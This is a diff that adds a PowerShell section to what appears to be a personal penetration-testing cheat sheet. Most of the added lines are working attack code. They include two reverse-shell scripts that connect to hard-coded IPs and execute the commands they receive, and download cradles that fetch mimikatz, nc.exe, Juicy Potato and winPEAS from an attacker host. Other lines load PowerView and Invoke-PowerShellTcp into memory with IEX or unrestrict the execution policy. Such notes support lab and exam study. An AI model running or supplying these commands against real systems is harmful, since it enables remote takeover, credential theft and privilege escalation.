@@ -222,7 +222,59 @@ include($incfile.".php");
 
 #  POWERSHELL
 ```bash
+Set-ExecutionPolicy Unrestricted
+-c is the option used to act like the command is comming from within a powershell already.
+````
+##### ONE LINER 
+````
+$client = New-Object System.Net.Sockets.TCPClient("192.168.119.136",8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+````
+##### Downloads (FILE)
+````
+powershell -c IEX "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.136/Juicy.Potato.x86.exe','C:\Users\jill\Desktop\Juicy.Potato.x86.exe')"
+powershell -c IEX "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.136/nc.exe','C:\Users\jill\Desktop\nc.exe')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.136/winPEASany.exe','C:\Users\winPEASany.exe')"
+powershell -c IEX "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.136/mimikatz.exe','C:\mimikatz.exe')"
+````
+##### Downloads (Memory)
+````
+C:\Windows\system32>powershell -c iex (New-Object System.Net.Webclient).DownloadString('http://192.168.119.136/PowerView.ps1')
 
+powershell -c iex (New-Object System.Net.Webclient).DownloadString('http://192.168.119.136/Invoke-PowerShellTcp.ps1')
+powershell -c iex (New-Object System.Net.Webclient).DownloadString('http://192.168.119.136/Invoke-PowerShellTcp8888.ps1')
+
+````
+##### Reverse shell through PS?!
+````
+$client = New-Object System.Net.Sockets.TCPClient('192.168.0.17',7777);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+}
+$client.Close();
+````
+##### SysNative 32bit to 64
+````
+cd C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
+%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
+
+````
+##### 64 bit / 32 bit
+````
+[Environment]::Is64BitProcess
+
+if you happen to get unto an ancient windows machine that needs to execute 32 bit binaries its....
+[7:55 PM]
+32-bit (x86) PowerShell executable     %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+64-bit (x64) Powershell executable     %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
+32-bit (x86) Powershell ISE executable     %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
+64-bit (x64) Powershell ISE executable     %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe
 ```
 
 # MSFVENOM 
